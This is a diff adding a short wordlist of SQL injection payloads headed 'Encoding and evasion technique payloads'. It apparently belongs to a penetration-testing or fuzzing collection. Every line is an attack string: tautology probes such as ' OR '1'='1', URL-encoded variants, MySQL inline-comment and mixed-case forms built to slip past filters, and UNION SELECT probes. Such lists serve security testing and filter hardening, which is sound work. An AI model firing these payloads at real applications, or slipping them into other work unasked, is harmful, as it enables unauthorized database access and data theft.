@@ -1,0 +1,9 @@
+# Encoding and evasion technique payloads
+%27 OR %271%27=%271
+%27%20OR%20%271%27=%271
+' OR '1'='1' /*
+' /*!50000OR*/ '1'='1'--
+' AnD 1=1--
+' oR 1=1--
+' uNiOn sElEcT NULL--
+' UNION%20SELECT%20NULL--
